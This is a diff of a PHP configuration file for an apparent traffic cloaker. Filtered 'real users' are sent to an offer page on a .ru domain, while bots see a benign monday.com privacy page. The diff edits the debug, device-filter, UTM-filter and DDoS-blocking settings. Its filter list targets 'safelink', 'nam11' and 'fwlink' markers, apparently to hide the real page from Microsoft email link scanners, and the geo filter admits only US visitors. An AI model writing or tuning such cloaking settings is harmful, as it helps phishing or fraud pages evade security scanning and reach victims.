@@ -5,7 +5,7 @@ $HCSET['PASSIVE'] = false;
 /* Required settings     */
 $HCSET['OFFER_PAGE'] = 'https://techluminizesa.ru/Ma4Y/';//PHP/HTML file or URL offer used for real users
 $HCSET['WHITE_PAGE'] = 'https://monday.com/l/privacy/privacy-policy/';//PHP/HTML file or URL used for bots
-$HCSET['DEBUG_MODE'] = 'off';// replace "on" with "off" to switch from debug to production mode
+$HCSET['DEBUG_MODE'] = 'on';// replace "on" with "off" to switch from debug to production mode
 /*********************************************/
 /* Available additional settings  */
 
@@ -14,12 +14,12 @@ $HCSET['FILTER_GEO_MODE'] = 'allow'; // string(allow|reject)
 $HCSET['FILTER_GEO_LIST'] = 'us'; // string([2Chars country codes])
 
 /* DEVICE FILTERS */
-$HCSET['FILTER_DEV_MODE'] = 'allow'; // 'allow|reject'
-$HCSET['FILTER_DEV_LIST'] = 'm_Android,m_iOS,d_macOS,d_Windows'; // string([d_Windows|m_Android|m_iOS|d_macOS|m_other|d_other]);
+$HCSET['FILTER_DEV_MODE'] = ''; // 'allow|reject'
+$HCSET['FILTER_DEV_LIST'] = ''; // string([d_Windows|m_Android|m_iOS|d_macOS|m_other|d_other]);
 
 /* UTM FILTERS */
 $HCSET['FILTER_UTM_MODE'] = 'allow'; // 'allow|reject'
-$HCSET['FILTER_UTM_LIST'] = 'utm_NA, fwlink, LinkId, , nam11, safelink, walkaway'; // 'regExp()';
+$HCSET['FILTER_UTM_LIST'] = 'utm_NA, fwlink, LinkId, nam11, safelink, walkaway'; // 'regExp()';
 
 /* REFERER FILTERS */
 $HCSET['FILTER_REF_MODE'] = ''; // 'allow|reject'
@@ -49,7 +49,7 @@ $HCSET['OFFER_METHOD'] = 'meta';
 $HCSET['WHITE_METHOD'] = '302privacy';
 
 /* change 'false' to 'true' to permanently block the IP from which the DDOS attack is coming */
-$HCSET['BLOCK_DDOS'] = false;
+$HCSET['BLOCK_DDOS'] = true;
 /* DELAY_START allows you to block the first X unique IP addresses. */
 $HCSET['DELAY_START'] = 0;
 /* DELAY_PERMANENT always show the whitepage for IP in the list of first X requests */
@@ -64,7 +64,7 @@ $HCSET['DISABLE_CACHE'] = false; // true|false
 $HCSET['SKIP_CACHE'] = false ; // true|false
 /*********************************************/
 /* You API key.                              */
-/* DO NOT SHARE API KEY! KEEP IT SECRET! */
+/* DO NOT SHARE API KEY! KEEP IT SECRET!     */
 $HCSET['API_SECRET_KEY'] = $_ENV['API_SECRET_KEY'];
 /*********************************************/
 
